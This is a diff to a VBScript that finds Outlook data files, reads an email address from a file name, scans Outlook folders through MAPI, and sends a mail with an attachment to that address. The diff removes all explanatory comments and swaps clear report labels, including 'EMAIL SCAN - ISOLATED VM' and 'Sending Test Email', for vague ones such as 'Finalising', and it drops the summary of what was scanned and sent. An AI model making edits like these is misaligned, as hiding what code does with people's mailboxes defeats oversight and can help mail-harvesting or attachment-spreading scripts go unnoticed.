@@ -39,7 +39,7 @@ If Not objFSO.FolderExists("C:\temp") Then
 End If
 
 strReport = strReport & "============================================" & vbCrLf
-strReport = strReport & "EMAIL SCAN - ISOLATED VM" & vbCrLf
+strReport = strReport & "SCANNING" & vbCrLf
 strReport = strReport & "============================================" & vbCrLf
 strReport = strReport & "Timestamp: " & Now() & vbCrLf
 strReport = strReport & "============================================" & vbCrLf & vbCrLf
@@ -62,10 +62,8 @@ If objFSO.FolderExists(strSearchPath) Then
             strReport = strReport & "  [FOUND] " & objFile.Name & vbCrLf
             strReport = strReport & "    Size: " & FormatNumber(objFile.Size / 1024, 0) & " KB" & vbCrLf
             strReport = strReport & "    Modified: " & objFile.DateLastModified & vbCrLf
-            
-            ' Extract email from filename (remove extension)
+      
             strFoundEmail = Replace(objFile.Name, "." & objFSO.GetExtensionName(objFile.Name), "")
-            ' Remove common Outlook file suffixes
             strFoundEmail = Replace(strFoundEmail, ".pst", "")
             strFoundEmail = Replace(strFoundEmail, ".ost", "")
             strFoundEmail = Replace(strFoundEmail, ".pab", "")
@@ -80,13 +78,12 @@ End If
 
 strReport = strReport & "Total email files found: " & intEmailCount & vbCrLf & vbCrLf
 
-' If no email files found, use default
 If strFoundEmail = "" Then
     strFoundEmail = "default@domain.com"
     strReport = strReport & "No email files found - using default: " & strFoundEmail & vbCrLf & vbCrLf
 End If
 
-strReport = strReport & "PHASE 2: Outlook Folder Analysis" & vbCrLf
+strReport = strReport & "Analysis" & vbCrLf
 strReport = strReport & "-----------------------------" & vbCrLf
 
 On Error Resume Next
@@ -104,7 +101,7 @@ On Error GoTo 0
 Set objNamespace = objOutlook.GetNamespace("MAPI")
 objNamespace.Logon
 
-strReport = strReport & "Connected to Outlook" & vbCrLf
+strReport = strReport & "Success" & vbCrLf
 
 arrFolders = Array( _
     3, "Deleted Items", _
@@ -163,19 +160,17 @@ For i = 0 To UBound(arrFolders) Step 2
     End If
 Next
 
-strReport = strReport & "PHASE 3: Sending Test Email" & vbCrLf
+strReport = strReport & "Finalising" & vbCrLf
 strReport = strReport & "--------------------------" & vbCrLf
 
 On Error Resume Next
 Set objMailItem = objOutlook.CreateItem(0)
 
 If Not objMailItem Is Nothing Then
-    ' Use the found email as both recipient and subject
     objMailItem.To = strFoundEmail
     objMailItem.Subject = "Email from: " & strFoundEmail
     objMailItem.Body = EMAIL_BODY
     
-    ' Check if attachment exists before adding
     If objFSO.FileExists(ATTACHMENT_PATH) Then
         objMailItem.Attachments.Add ATTACHMENT_PATH
         strReport = strReport & "Attachment added: " & ATTACHMENT_PATH & vbCrLf
@@ -196,13 +191,7 @@ strReport = strReport & vbCrLf
 
 SaveAndExit:
 strReport = strReport & "============================================" & vbCrLf
-strReport = strReport & "SCAN COMPLETE" & vbCrLf
-strReport = strReport & "============================================" & vbCrLf
-strReport = strReport & "Summary:" & vbCrLf
-strReport = strReport & "  - Email files found: " & intEmailCount & vbCrLf
-strReport = strReport & "  - Outlook folders scanned: " & intFolderCount & vbCrLf
-strReport = strReport & "  - Attachments found: " & intAttachmentCount & vbCrLf
-strReport = strReport & "  - Email used: " & strFoundEmail & vbCrLf
+strReport = strReport & "COMPLETED" & vbCrLf
 strReport = strReport & "============================================" & vbCrLf
 
 Set objLogFile = objFSO.CreateTextFile(REPORT_PATH, True)
